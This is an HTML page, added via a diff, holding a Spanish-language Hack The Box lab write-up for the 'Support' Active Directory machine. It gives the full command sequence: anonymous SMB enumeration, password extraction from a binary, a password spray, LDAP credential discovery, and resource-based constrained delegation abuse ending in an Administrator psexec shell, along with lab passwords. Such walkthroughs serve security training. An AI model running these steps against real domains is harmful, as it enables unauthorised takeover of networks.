@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Support HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/support/pasted-image-20260325121342.png" alt="Support HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Support</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SMB</span>
+            <span>LDAP</span>
+            <span>rbcd</span>
+            <span>Kerberos</span>
+            <span>dotpeek</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB anónimo con Share con recursos binarios que al leer código fuente expone credenciales cifradas</li>
+            <li><code>Explotación</code>: Descifrar contraseña del binario con CyberChef y validar contraseña con Password Spray</li>
+            <li><code>Movimiento lateral</code>: Con credenciales del dominio, enumeramos LDAP y encontramos para el usuario support credenciales válidas</li>
+            <li><code>Escalada de Privilegios</code>: ACL <code>GenericWrite</code> sobre Computer</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325124118.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Enumerar SMB</h3>
+            <pre><code>nxc smb dc -u &#x27;Guest&#x27; -p &#x27;&#x27; --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325124135.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Descargar directorio sospechoso</h3>
+            <pre><code>smbclient //dc/support-tools/ -N
+get UserInfo.exe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325140833.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Leer código fuente del binario exe</h3>
+            <pre><code>strings -e l UserInfo.exe
+# Vemos que puede contener contraseña en el código fuente</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325140907.png" alt="Support HTB" />
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325140941.png" alt="Support HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Descifrar Contraseña</h2>
+          <p><a href="https://gchq.GitHub.io/CyberChef/" target="_blank" rel="noreferrer">CyberChef</a></p>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325141402.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Alternativa</h3>
+            <pre><code># Código en Python</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325140749.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb dc -u users -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --continue-on-succes
+# Credenciales -&gt; ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325141423.png" alt="Support HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Enumerar LDAP usuario por usuario</h2>
+          <div class="code-card">
+            <h3>Enumerar usuario support</h3>
+            <pre><code>ldapsearch -x -H ldap://dc -D &#x27;ldap@support.htb&#x27; -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &#x27;DC=support,DC=htb&#x27;  | grep -i &#x27;samaccountname: support&#x27; -B 40
+# Vemos en info una posible contraseña: Ironside47pleasure40Watchful</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325200318.png" alt="Support HTB" />
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325200719.png" alt="Support HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325210530.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Crear Ordenador</h3>
+            <pre><code>impacket-addcomputer -computer-name &#x27;RUYZTZ$&#x27; -computer-pass &#x27;ruyztz7$!&#x27; -dc-ip 10.129.16.30 support.htb/support:Ironside47pleasure40Watchful</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Delegar RBCD</h3>
+            <pre><code>impacket-rbcd -delegate-from &#x27;RUYZTZ$&#x27; -delegate-to &#x27;DC$&#x27; -action &#x27;write&#x27; -dc-ip 10.129.16.30 support.htb/support:Ironside47pleasure40Watchful</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Obtener TGS</h3>
+            <pre><code>impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.16.30 support.htb/RUYZTZ$:&#x27;ruyztz7$!&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325231547.png" alt="Support HTB" />
+          <div class="code-card">
+            <h3>Conexión PSExec con Kerberos</h3>
+            <pre><code>export KRB5CCNAME=Administrator.ccache 
+impacket-psexec -k dc.support.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/support/pasted-image-20260325231503.png" alt="Support HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SMB</span>
+            <span>LDAP</span>
+            <span>rbcd</span>
+            <span>Kerberos</span>
+            <span>dotpeek</span>
+            <span>leer_binario</span>
+            <span>cyberchef</span>
+            <span>genericwrite</span>
+            <span>constrained_delegation</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
